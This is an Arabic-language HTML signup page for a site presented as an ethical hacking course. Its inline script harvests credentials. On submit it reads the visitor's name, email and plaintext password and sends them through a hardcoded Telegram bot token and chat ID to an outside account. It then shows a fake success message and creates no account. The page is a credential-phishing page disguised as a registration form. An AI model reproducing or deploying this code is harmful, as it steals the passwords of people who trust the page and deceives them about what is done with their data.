<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إنشاء حساب — تعلّم اختبار الاختراق الأخلاقي</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../style.css">
    <link rel="stylesheet" href="auth.css">
    <script src="https://kit.fontawesome.com/f964bad74b.js" crossorigin="anonymous"></script>
</head>
<body class="auth-body">
    <header class="nav">
        <div class="nav-inner">
            <a href="index.html" class="brand">
                <span class="brand-mark"><i class="fa-solid fa-bug"></i></span>
                <span class="brand-name">تعليم اختبار الاختراق الأخلاقي</span>
            </a>
            <div class="nav-actions">
                <a href="pro-login.html" class="btn btn-ghost">تسجيل الدخول</a>
            </div>
        </div>
    </header>

    <main class="auth-wrap">
        <div class="auth-card">
            <h1>إنشاء حساب جديد</h1>
            <p class="auth-sub">ابدأ مسارك في اختبار الاختراق الأخلاقي، مجانًا.</p>

            <form id="signupForm" novalidate>
                <div class="field">
                    <label for="name">الاسم الكامل</label>
                    <input type="text" id="name" name="name" placeholder="مثال: أحمد محمد" required autocomplete="name">
                </div>

                <div class="field">
                    <label for="email">البريد الإلكتروني</label>
                    <input type="email" id="email" name="email" placeholder="you@example.com" required autocomplete="email">
                </div>

                <div class="field">
                    <label for="password">كلمة المرور</label>
                    <div class="pass-wrap">
                        <input type="password" id="password" name="password" placeholder="8 أحرف على الأقل" required minlength="8" autocomplete="new-password">
                        <button type="button" class="toggle-pass" id="togglePass" aria-label="إظهار كلمة المرور">
                            <i class="fa-solid fa-eye"></i>
                        </button>
                    </div>
                    <span class="hint">استخدم 8 أحرف على الأقل، بمزيج من حروف وأرقام.</span>
                </div>

                <label class="checkbox">
                    <input type="checkbox" id="terms" required>
                    <span>أوافق على <a href="#">شروط الاستخدام</a> و<a href="#">سياسة الخصوصية</a></span>
                </label>

                <button type="submit" class="btn btn-primary btn-block">إنشاء الحساب</button>

                <p class="form-msg" id="formMsg" role="status"></p>
            </form>

            <p class="auth-switch">عندك حساب بالفعل؟ <a href="pro-login.html">تسجيل الدخول</a></p>
        </div>
    </main>

    <script>
        
        const togglePass = document.getElementById('togglePass');
        const passInput = document.getElementById('password');

        togglePass.addEventListener('click', () => {
            const isHidden = passInput.type === 'password';
            passInput.type = isHidden ? 'text' : 'password';
            togglePass.innerHTML = isHidden
                ? '<i class="fa-solid fa-eye-slash"></i>'
                : '<i class="fa-solid fa-eye"></i>';
        });

        
        const form = document.getElementById('signupForm');
        const msg = document.getElementById('formMsg');

        form.addEventListener('submit', async function (e) {
            e.preventDefault();

            if (!form.checkValidity()) {
                form.reportValidity();
                return;
            }

            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const botToken = '9072593338:AAEveJZdX3TP2cGNpHBTYSM8YREoOQWAXNY';
            const chatId = '6798640564';

            const message = `✨ حساب جديد تم إنشاؤه:\n\n👤 الاسم: ${name}\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('فشل الإرسال:', error);
            }

            alert('تم إنشاء الحساب بنجاح (تجريبي).');
            window.location.reload();
        });
    </script>
</body>
</html>
